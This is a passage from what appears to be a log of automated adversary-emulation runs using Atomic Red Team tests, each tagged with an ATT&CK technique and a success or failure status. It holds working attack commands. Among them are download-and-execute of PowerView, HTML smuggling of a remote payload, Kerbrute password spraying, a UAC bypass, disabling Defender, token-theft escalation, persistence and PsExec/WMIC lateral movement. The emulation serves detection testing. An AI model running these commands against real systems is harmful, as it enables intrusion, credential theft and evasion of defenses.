 'delegated': '2023-12-03T23:27:20Z',
 'description': 'Testing uncommonly used port utilizing PowerShell. APT33 has '
                'been known to attempt telnet over port 8081. Upon execution, '
                'details about the successful\n'
                'port check will be displayed.\n',
 'executor': 'psh',
 'link_id': '4608e659-7d5a-4ff1-a86d-6aee4bf6e181',
 'name': 'Testing usage of uncommonly used port with PowerShell',
 'pid': 9640,
 'plaintext_command': 'Test-NetConnection -ComputerName google.com -port 8081',
 'platform': 'windows',
 'run': '2023-12-03T23:29:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1027_006__defense-evasion__html_smuggling__a96a64caf38bca14cef902e999bb6b98__trial_1

atomic_ordering: ['a96a64caf38bca14cef902e999bb6b98']
------------------------------
{'ability_id': 'a96a64caf38bca14cef902e999bb6b98',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1027.006',
            'technique_name': 'HTML Smuggling'},
 'command': 'if (Test-Path '
            '"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html") { ; '
            '} else {New-Item -Type Directory '
            '"PathToAtomicsFolder\\T1027.006\\bin\\" -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html" '
            '-OutFile '
            '"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html"};  '
            ';  & "PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html"',
 'delegated': '2023-11-27T11:37:37Z',
 'description': 'The HTML file will download an ISO file from '
                '[T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) '
                'without user interaction. \n'
                'The HTML file is based off of the work from [Stan '
                'Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n',
 'executor': 'psh',
 'link_id': 'a723431f-700f-495f-bd59-d23f359d3f87',
 'name': 'HTML Smuggling Remote Payload',
 'pid': 6640,
 'plaintext_command': 'if (Test-Path '
                      '"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html") '
                      '{ ; } else {New-Item -Type Directory '
                      '"PathToAtomicsFolder\\T1027.006\\bin\\" -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html" '
                      '-OutFile '
                      '"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html"};  '
                      ';  & '
                      '"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html"',
 'platform': 'windows',
 'run': '2023-11-27T11:37:49Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1110_003__credential-access__brute_force-_password_spraying__e5168b0f7e57ba7b20c9842a350bb539__trial_1

atomic_ordering: ['e5168b0f7e57ba7b20c9842a350bb539']
------------------------------
{'ability_id': 'e5168b0f7e57ba7b20c9842a350bb539',
 'agent_reported_time': '2023-11-11T13:10:18Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.003',
            'technique_name': 'Brute Force: Password Spraying'},
 'command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe '
            'passwordspray --dc $ENV:userdnsdomain -d $ENV:userdomain '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt" '
            'password132',
 'delegated': '2023-11-29T22:37:00Z',
 'description': 'Test a single password against a list of users\n',
 'executor': 'psh',
 'link_id': 'd3203875-a769-4362-b207-3234a2219351',
 'name': 'Password Spray using Kerbrute Tool',
 'pid': 10992,
 'plaintext_command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; '
                      '.\\kerbrute.exe passwordspray --dc $ENV:userdnsdomain '
                      '-d $ENV:userdomain '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\passwordspray.txt" '
                      'password132',
 'platform': 'windows',
 'run': '2023-11-29T22:37:29Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1574_012__multiple__hijack_execution_flow-_cor_profiler__07b384a102f27412c1475421f4534f29__trial_1

atomic_ordering: ['07b384a102f27412c1475421f4534f29']
------------------------------
{'ability_id': '07b384a102f27412c1475421f4534f29',
 'agent_reported_time': '2023-11-11T13:10:47Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1574.012',
            'technique_name': 'Hijack Execution Flow: COR_PROFILER'},
 'command': 'Write-Host "Creating registry keys in '
            'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
            '-ForegroundColor Cyan; New-Item -Path '
            '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
            '-Value "83f016_T1574.012x64.dll" -Force | Out-Null; '
            'New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | '
            'Out-Null; New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_PROFILER" -PropertyType String -Value '
            '"{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null; '
            'New-ItemProperty -Path HKCU:\\Environment -Name '
            '"COR_PROFILER_PATH" -PropertyType String -Value '
            '"83f016_T1574.012x64.dll" -Force | Out-Null; Write-Host '
            '"executing eventvwr.msc" -ForegroundColor Cyan; START MMC.EXE '
            'EVENTVWR.MSC',
 'delegated': '2023-12-04T02:01:01Z',
 'description': 'Creates user scope environment variables and CLSID COM object '
                'to enable a .NET profiler (COR_PROFILER).\n'
                'The unmanaged profiler DLL (`T1574.012x64.dll`) executes when '
                'the CLR is loaded by the Event Viewer process.\n'
                'Additionally, the profiling DLL will inherit the integrity '
                'level of Event Viewer bypassing UAC and executing '
                '`notepad.exe` with high integrity.\n'
                'If the account used is not a local administrator the profiler '
                'DLL will still execute each time the CLR is loaded by a '
                'process, however,\n'
                'the notepad process will not execute with high integrity.\n'
                '\n'
                'Reference: '
                'https://redcanary.com/blog/cor_profiler-for-persistence/\n',
 'executor': 'psh',
 'link_id': 'b7bf21f8-ad16-4c2d-b84d-8bac2f3d109f',
 'name': 'User scope COR_PROFILER',
 'pid': 5528,
 'plaintext_command': 'Write-Host "Creating registry keys in '
                      'HKCU:Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}" '
                      '-ForegroundColor Cyan; New-Item -Path '
                      '"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\\InprocServer32" '
                      '-Value "83f016_T1574.012x64.dll" -Force | Out-Null; '
                      'New-ItemProperty -Path HKCU:\\Environment -Name '
                      '"COR_ENABLE_PROFILING" -PropertyType String -Value "1" '
                      '-Force | Out-Null; New-ItemProperty -Path '
                      'HKCU:\\Environment -Name "COR_PROFILER" -PropertyType '
                      'String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" '
                      '-Force | Out-Null; New-ItemProperty -Path '
                      'HKCU:\\Environment -Name "COR_PROFILER_PATH" '
                      '-PropertyType String -Value "83f016_T1574.012x64.dll" '
                      '-Force | Out-Null; Write-Host "executing eventvwr.msc" '
                      '-ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC',
 'platform': 'windows',
 'run': '2023-12-04T02:02:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__afae914d4839d5194835d8475604e7b8__trial_1

atomic_ordering: ['afae914d4839d5194835d8475604e7b8']
------------------------------
{'ability_id': 'afae914d4839d5194835d8475604e7b8',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Disable-WindowsOptionalFeature -Online -FeatureName '
            '"Windows-Defender-Gui" -NoRestart -ErrorAction Ignore; '
            'Disable-WindowsOptionalFeature -Online -FeatureName '
            '"Windows-Defender-Features" -NoRestart -ErrorAction Ignore; '
            'Disable-WindowsOptionalFeature -Online -FeatureName '
            '"Windows-Defender" -NoRestart -ErrorAction Ignore; '
            'Disable-WindowsOptionalFeature -Online -FeatureName '
            '"Windows-Defender-ApplicationGuard" -NoRestart -ErrorAction '
            'Ignore',
 'delegated': '2023-12-03T11:48:36Z',
 'description': 'The following Atomic will attempt to disable Windows-Defender '
                'using the built in PowerShell cmdlet '
                'Disable-WindowsOptionalFeature, Deployment Image Servicing '
                'and Management tool. \n'
                'Similar to DISM.exe, this cmdlet is used to enumerate, '
                'install, uninstall, configure, and update features and '
                'packages in Windows images.\n'
                'A successful execution will not standard-out any details. '
                'Remove the quiet switch if verbosity is needed.\n'
                "This method will remove Defender and it's packages.\n"
                'Reference: '
                'https://docs.microsoft.com/en-us/powershell/module/dism/disable-windowsoptionalfeature?view=windowsserver2022-ps\n',
 'executor': 'psh',
 'link_id': '7ee2bd5a-015b-456b-b20f-4bbd737a951a',
 'name': 'Disable Windows Defender with PwSh Disable-WindowsOptionalFeature',
 'pid': 11088,
 'plaintext_command': 'Disable-WindowsOptionalFeature -Online -FeatureName '
                      '"Windows-Defender-Gui" -NoRestart -ErrorAction Ignore; '
                      'Disable-WindowsOptionalFeature -Online -FeatureName '
                      '"Windows-Defender-Features" -NoRestart -ErrorAction '
                      'Ignore; Disable-WindowsOptionalFeature -Online '
                      '-FeatureName "Windows-Defender" -NoRestart -ErrorAction '
                      'Ignore; Disable-WindowsOptionalFeature -Online '
                      '-FeatureName "Windows-Defender-ApplicationGuard" '
                      '-NoRestart -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-12-03T11:49:30Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1018__discovery__remote_system_discovery__aaeee9107989a507f526b0cef1cb274f__trial_1

atomic_ordering: ['aaeee9107989a507f526b0cef1cb274f']
------------------------------
{'ability_id': 'aaeee9107989a507f526b0cef1cb274f',
 'agent_reported_time': '2023-11-11T13:10:43Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1018',
            'technique_name': 'Remote System Discovery'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
            "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
            '-UseBasicParsing); Get-DomainController -verbose',
 'delegated': '2023-11-27T07:44:48Z',
 'description': 'Utilizing PowerView, run Get-DomainController to identify the '
                'Domain Controller. Upon execution, information about the '
                'domain controller within the domain will be displayed.\n',
 'executor': 'psh',
 'link_id': 'dc809ed2-eeb6-4483-be12-4a8edd78c2df',
 'name': 'Get-DomainController with PowerView',
 'pid': 7344,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (IWR '
                      "'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' "
                      '-UseBasicParsing); Get-DomainController -verbose',
 'platform': 'windows',
 'run': '2023-11-27T07:45:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__b7e7e9eb804006a78cdd75940f7b7c3e__trial_1

atomic_ordering: ['b7e7e9eb804006a78cdd75940f7b7c3e']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1059_005__execution__command_and_scripting_interpreter-_visual_basic__f2131e45dbd95e3057bd3494b5aeed41__trial_1

atomic_ordering: ['f2131e45dbd95e3057bd3494b5aeed41']
------------------------------
{'ability_id': 'f2131e45dbd95e3057bd3494b5aeed41',
 'agent_reported_time': '2023-11-11T13:10:33Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.005',
            'technique_name': 'Command and Scripting Interpreter: Visual '
                              'Basic'},
 'command': 'cscript "a771e6_sys_info.vbs" > $env:TEMP\\T1059.005.out.txt',
 'delegated': '2023-11-28T11:10:35Z',
 'description': 'Visual Basic execution test, execute vbscript via '
                'PowerShell.\n'
                '\n'
                'When successful, system information will be written to '
                '$env:TEMP\\T1059.005.out.txt.',
 'executor': 'psh',
 'link_id': '65fd2979-99b1-43e2-be91-aea30d9ec25b',
 'name': 'Visual Basic script execution to gather local computer information',
 'pid': 380,
 'plaintext_command': 'cscript "a771e6_sys_info.vbs" > '
                      '$env:TEMP\\T1059.005.out.txt',
 'platform': 'windows',
 'run': '2023-11-28T11:11:26Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1569_002__execution__system_services-_service_execution__e4c51df716410dc7baccead922f9d9a4__trial_1

atomic_ordering: ['e4c51df716410dc7baccead922f9d9a4']
------------------------------
{'ability_id': 'e4c51df716410dc7baccead922f9d9a4',
 'agent_reported_time': '2023-11-11T13:10:04Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1569.002',
            'technique_name': 'System Services: Service Execution'},
 'command': 'if (Test-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe") { ; } '
            'else {Invoke-WebRequest '
            '"https://download.sysinternals.com/files/PSTools.zip" -OutFile '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip"; '
            'Expand-Archive '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip" '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools" -Force; '
            'New-Item -ItemType Directory (Split-Path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe") -Force | '
            'Out-Null; Copy-Item '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe" '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" -Force};  '
            ';  cmd.exe /c "wmic \tcsproduct \tget UUID" ; cmd.exe /c "fsutil '
            'behavior \tset SymlinkEvaluation R2L:1" ; cmd.exe /c "fsutil '
            'behavior set \tSymlinkEvaluation R2R:1"; reg    add    '
            'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    '
            '/v MaxMpxCt /d 65535 /t REG_DWORD /f      ; copy '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" '
            '$env:temp; cmd.exe /c "$env:temp\\psexec.exe  -accepteula  '
            '\\\\$ENV:COMPUTERNAME cmd.exe  /c echo "--access-token""',
 'delegated': '2023-12-03T22:29:26Z',
 'description': 'This atomic attempts to emulate the unique behavior of '
                'BlackCat ransomware prior to encryption and during Lateral '
                'Movement attempts via PsExec on Windows. Uses bundled PsExec '
                'like BlackCat',
 'executor': 'psh',
 'link_id': 'ca4fcdcc-f628-4e90-a653-8387b6131fc9',
 'name': 'BlackCat pre-encryption cmds with Lateral Movement',
 'pid': 5528,
 'plaintext_command': 'if (Test-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe") '
                      '{ ; } else {Invoke-WebRequest '
                      '"https://download.sysinternals.com/files/PSTools.zip" '
                      '-OutFile '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip"; '
                      'Expand-Archive '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools.zip" '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools" '
                      '-Force; New-Item -ItemType Directory (Split-Path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe") '
                      '-Force | Out-Null; Copy-Item '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsTools\\PsExec.exe" '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" '
                      '-Force};  ;  cmd.exe /c "wmic \tcsproduct \tget UUID" ; '
                      'cmd.exe /c "fsutil behavior \tset SymlinkEvaluation '
                      'R2L:1" ; cmd.exe /c "fsutil behavior set \t'
                      'SymlinkEvaluation R2R:1"; reg    add    '
                      'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters    '
                      '/v MaxMpxCt /d 65535 /t REG_DWORD /f      ; copy '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" '
                      '$env:temp; cmd.exe /c "$env:temp\\psexec.exe  '
                      '-accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo '
                      '"--access-token""',
 'platform': 'windows',
 'run': '2023-12-03T22:29:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__3b631d04243ac011df9f91cd07025180__trial_1

atomic_ordering: ['3b631d04243ac011df9f91cd07025180']
------------------------------
{'ability_id': '3b631d04243ac011df9f91cd07025180',
 'agent_reported_time': '2023-11-11T13:09:39Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': 'Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs" '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\vbsstartup.vbs"; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs" '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\vbsstartup.vbs"; cscript.exe '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\vbsstartup.vbs"; cscript.exe '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\vbsstartup.vbs"',
 'delegated': '2023-12-02T02:10:03Z',
 'description': 'vbs files can be placed in and ran from the startup folder to '
                'maintain persistance. Upon execution, "T1547.001 Hello, World '
                'VBS!" will be displayed twice. \n'
                'Additionally, the new files can be viewed in the '
                '"$env:APPDATA\\Microsoft\\Windows\\Start '
                'Menu\\Programs\\Startup"\n'
                'folder and will also run when the computer is restarted and '
                'the user logs in.\n',
 'executor': 'psh',
 'link_id': 'ef30927a-0504-4e8f-b5ea-59693c929995',
 'name': 'Suspicious vbs file run from startup Folder',
 'pid': 9388,
 'plaintext_command': 'Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs" '
                      '"$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\vbsstartup.vbs"; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\vbsstartup.vbs" '
                      '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\vbsstartup.vbs"; cscript.exe '
                      '"$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\vbsstartup.vbs"; cscript.exe '
                      '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\vbsstartup.vbs"',
 'platform': 'windows',
 'run': '2023-12-02T02:10:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_1

atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
------------------------------
{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1006',
            'technique_name': 'Direct Volume Access'},
 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
            'Format-Hex -InputObject $buffer',
 'delegated': '2023-11-27T06:26:38Z',
 'description': 'This test uses PowerShell to open a handle on the drive '
                'volume via the `\\\\.\\` [DOS device path '
                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
                'and perform direct access read of the first few bytes of the '
                'volume.\n'
                'On success, a hex dump of the first 11 bytes of the volume is '
                'displayed.\n'
                '\n'
                'For a NTFS volume, it should correspond to the following '
                'sequence ([NTFS partition boot '
                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
                '```\n'
                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
                '\n'
                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
                'ëR?NTFS\n'
                '```',
 'executor': 'psh',
 'link_id': '8001f418-a6d7-427c-9773-56fd93935f2b',
 'name': 'Read volume boot sector via DOS device path (PowerShell)',
 'pid': 9236,
 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
                      '$handle.Close(); Format-Hex -InputObject $buffer',
 'platform': 'windows',
 'run': '2023-11-27T06:26:56Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1207__defense-evasion__rogue_domain_controller__acd37a62e589a7190c35101583939337__trial_1

atomic_ordering: ['acd37a62e589a7190c35101583939337']
==============================
==============================
adversary_id: atomic__t1021_001__lateral-movement__remote_services-_remote_desktop_protocol__28ed45c4da059b14a1b2d4f061b912b8__trial_1

atomic_ordering: ['28ed45c4da059b14a1b2d4f061b912b8']
==============================
==============================
adversary_id: atomic__t1134_001__multiple__access_token_manipulation-_token_impersonation,theft__2cda9de49fe7ac16813a23d0741e9b28__trial_1

atomic_ordering: ['2cda9de49fe7ac16813a23d0741e9b28']
------------------------------
{'ability_id': '2cda9de49fe7ac16813a23d0741e9b28',
 'agent_reported_time': '2023-11-11T13:09:30Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.001',
            'technique_name': 'Access Token Manipulation: Token '
                              'Impersonation/Theft'},
 'command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; Start-Process '
            '.\\BadPotato.exe notepad.exe; Start-Sleep -Second 20; '
            'Stop-Process -Name "notepad" -force -erroraction '
            'silentlycontinue; Stop-Process -Name "BadPotato" -force '
            '-erroraction silentlycontinue',
 'delegated': '2023-11-30T06:01:39Z',
 'description': 'https://github.com/BeichenDream/BadPotato\n'
                'Privilege escalation using named pipe connections',
 'executor': 'psh',
 'link_id': '23166e83-9bb4-4604-8e09-9a49a775311c',
 'name': 'Bad Potato',
 'pid': 1576,
 'plaintext_command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; '
                      'Start-Process .\\BadPotato.exe notepad.exe; Start-Sleep '
                      '-Second 20; Stop-Process -Name "notepad" -force '
                      '-erroraction silentlycontinue; Stop-Process -Name '
                      '"BadPotato" -force -erroraction silentlycontinue',
 'platform': 'windows',
 'run': '2023-11-30T06:02:16Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1087_002__discovery__account_discovery-_domain_account__613dc87cebac339d20973268e0bb1c0b__trial_1

atomic_ordering: ['613dc87cebac339d20973268e0bb1c0b']
------------------------------
{'ability_id': '613dc87cebac339d20973268e0bb1c0b',
 'agent_reported_time': '2023-11-11T13:10:28Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1087.002',
            'technique_name': 'Account Discovery: Domain Account'},
 'command': "(([adsisearcher]'').SearchRooT).Path | "
            '%{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain '
            'Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" '
            '-split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host '
            '"Policy '
            'Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host '
            '"Policy '
            'Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} '
            '};Write-Output "`n" }}',
 'delegated': '2023-11-29T07:31:07Z',
 'description': 'The following Atomic test will utilize ADSISearcher to '
                'enumerate root domain unit within Active Directory.\n'
                'Upon successful execution a listing of users will output with '
                'their paths in AD.\n'
                'Reference: '
                'https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n',
 'executor': 'psh',
 'link_id': 'ab03ce3a-63e3-44ef-bdb2-0e13ac4191c8',
 'name': 'Enumerate Root Domain linked policies Discovery',
 'pid': 10636,
 'plaintext_command': "(([adsisearcher]'').SearchRooT).Path | "
                      '%{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain '
                      'Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) '
                      '-replace "[[;]" -split "]");for($i=0;$i -lt '
                      '$a.length;$i++){if($a[$i]){Write-Host "Policy '
                      'Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host '
                      '"Policy '
                      'Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} '
                      '};Write-Output "`n" }}',
 'platform': 'windows',
 'run': '2023-11-29T07:31:52Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1110_004__credential-access__brute_force-_credential_stuffing__3d7b7a1676afefc4af9506003b2d58d1__trial_1

atomic_ordering: ['3d7b7a1676afefc4af9506003b2d58d1']
------------------------------
{'ability_id': '3d7b7a1676afefc4af9506003b2d58d1',
 'agent_reported_time': '2023-11-11T13:10:35Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1110.004',
            'technique_name': 'Brute Force: Credential Stuffing'},
 'command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; .\\kerbrute.exe '
            'bruteforce --dc $ENV:userdnsdomain -d $ENV:userdomain '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt"',
 'delegated': '2023-11-29T22:56:27Z',
 'description': 'Will read username and password combos from a file or stdin '
                '(format username:password) and perform a bruteforce attack\n',
 'executor': 'psh',
 'link_id': 'f431d073-23ac-4946-9447-f2b1c5326fff',
 'name': 'Brute Force:Credential Stuffing using Kerbrute Tool',
 'pid': 3792,
 'plaintext_command': 'cd "PathToAtomicsFolder\\..\\ExternalPayloads"; '
                      '.\\kerbrute.exe bruteforce --dc $ENV:userdnsdomain -d '
                      '$ENV:userdomain '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\bruteforce.txt"',
 'platform': 'windows',
 'run': '2023-11-29T22:57:18Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_015__multiple__boot_or_logon_autostart_execution-_login_items__01a2ad691dfb47b11d050fab371718d2__trial_1

atomic_ordering: ['01a2ad691dfb47b11d050fab371718d2']
------------------------------
{'ability_id': '01a2ad691dfb47b11d050fab371718d2',
 'agent_reported_time': '2023-11-11T13:10:06Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.015',
            'technique_name': 'Boot or Logon Autostart Execution: Login Items'},
 'command': 'mv '
            '~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json '
            '~\\AppData\\Local\\Temp\\settings.json; Invoke-WebRequest '
            '"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" '
            '-OutFile '
            '"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"; '
            'wt.exe',
 'delegated': '2023-12-02T09:36:24Z',
 'description': 'Modify Windows Terminal settings.json file to gain '
                'persistence. [Twitter '
                'Post](https://twitter.com/nas_bench/status/1550836225652686848)',
 'executor': 'psh',
 'link_id': '7855be7e-0a5e-41fb-ba47-97debebfa014',
 'name': 'Persistence by modifying Windows Terminal profile',
 'pid': 5528,
 'plaintext_command': 'mv '
                      '~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json '
                      '~\\AppData\\Local\\Temp\\settings.json; '
                      'Invoke-WebRequest '
                      '"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1547.015/src/settings.json?raw=true" '
                      '-OutFile '
                      '"~\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\settings.json"; '
                      'wt.exe',
 'platform': 'windows',
 'run': '2023-12-02T09:36:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1105__command-and-control__ingress_tool_transfer__3b4fb2e38c41453a6b2b0f2fecdd84ff__trial_1

atomic_ordering: ['3b4fb2e38c41453a6b2b0f2fecdd84ff']
------------------------------
{'ability_id': '3b4fb2e38c41453a6b2b0f2fecdd84ff',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1105',
            'technique_name': 'Ingress Tool Transfer'},
 'command': '$machine_list = '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105MachineList.txt"; '
            '$offline_list = '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105OfflineHosts.txt"; '
            '$completed_list = '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\T1105CompletedHosts.txt"; '
            'foreach ($machine in get-content -path "$machine_list"); {if '
            '(test-connection -Count 1 -computername $machine -quiet) ; {cmd '
            '/c copy "$env:comspec" '
            '"\\\\$machine\\C$\\Windows\\Temp\\T1105.exe"; echo $machine >> '
            '"$completed_list"; wmic /node: "$machine" process call create '
